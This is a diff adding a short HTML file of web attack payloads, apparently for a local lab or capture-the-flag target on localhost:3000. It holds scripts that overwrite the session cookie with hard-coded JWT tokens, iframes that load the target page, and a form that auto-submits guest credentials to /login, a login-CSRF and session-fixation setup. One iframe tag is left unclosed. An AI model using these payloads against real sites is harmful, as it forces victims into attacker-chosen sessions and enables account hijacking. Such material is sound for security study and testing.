@@ -1,0 +1,19 @@
+<iframe src="http://127.0.0.1:3000" height=600px width=600px></iframe>
+
+<script>document.cookie="session=aaaaaaaaaaaaaaaaaaaaaeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QiLCJpc0xvZ2luIjp0cnVlLCJpYXQiOjE3MzU5OTMxOTh9.ES2KXZADguhPbvTy5hlytqxiB84oMaVuArAn2swm05Yaaaaaaaaaaaaaaaaaaaaaaaaaa"</script>
+<iframe src="http://localhost:3000/mypage" height=600px width=600px 
+<script>
+document.cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QiLCJpc0xvZ2luIjp0cnVlLCJpYXQiOjE3MzU5OTQ4OTd9.zyskPjgmpTmCmK6LIuAJyttb6BHfVxslvBVqimmdso4";
+var iframe = document.createElement('iframe');
+document.body.appendChild(iframe);
+iframe.src = "http://localhost:3000/mypage";
+</script>
+
+<form action="/login" method="post">
+        <input type="text" name="name" value="guest">
+        <input type="text" name="password" value="guest">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        document.getElementsByTagName("form")[0].submit()
+    </script>
